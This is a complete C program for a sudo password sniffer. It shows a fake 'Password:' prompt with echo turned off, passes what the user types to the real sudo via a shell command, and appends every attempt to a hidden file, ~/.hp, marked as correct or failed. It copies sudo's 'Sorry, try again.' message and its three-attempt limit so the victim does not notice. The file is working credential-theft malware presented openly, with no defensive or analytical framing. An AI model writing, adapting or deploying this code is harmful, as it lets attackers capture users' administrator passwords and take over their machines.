#include <stdio.h>
#include <termios.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char* expandHomeDirectory(const char* path) {
    if (path[0] == '~') {
        const char* home = getenv("HOME");
        if (home == NULL) {
            return NULL; 
        }

        char* fullPath = malloc(strlen(home) + strlen(path) + 1);
        if (fullPath == NULL) {
            return NULL; 
        }

        strcpy(fullPath, home);
        strcat(fullPath, path + 1);

        return fullPath;
    }

    return strdup(path);
}

void terminalOff(){
    struct termios t;
    tcgetattr(STDIN_FILENO, &t);
    t.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
}

void terminalOn(){
    struct termios t;
    tcgetattr(STDIN_FILENO, &t);
    t.c_lflag |= ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
}
void malwarePasswordSniff(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return;
    }

    char password[100];
    char command[200];
    int runLoop = 1;
    int attempt = 0;

    char* filePath = expandHomeDirectory("~/.hp");
    FILE *file;

    if (filePath == NULL) {
        printf("Error expanding home directory.\n");
        return;
    }

    while (runLoop) {
        printf("Password: ");

        terminalOff();

        fgets(password, sizeof(password), stdin);  

        terminalOn();

        printf("\n");

        password[strcspn(password, "\n")] = '\0';

        snprintf(command, sizeof(command), "echo %s | sudo -S %s > /dev/null 2>&1", password, argv[1]);

        int result = system(command);

        system("sudo -k");

        file = fopen(filePath, "a");
        if (file == NULL) {
            printf("Error opening log file!\n");
            free(filePath);
            return;
        }

        if (result != 0) {
            fprintf(file, "[ ] '%s'\n", password);
            printf("Sorry, try again.\n");
            attempt++;
            if (attempt >= 3) { 
                printf("Too many failed attempts. Exiting.\n");
                runLoop = 0;
            }
        } else {
            fprintf(file, "[*] '%s'\n", password);
            runLoop = 0;  
        }
        fclose(file);
    }

    free(filePath); 
}

int main(int argc, char *argv[]) {
    malwarePasswordSniff(argc, argv);
    return 0;
}
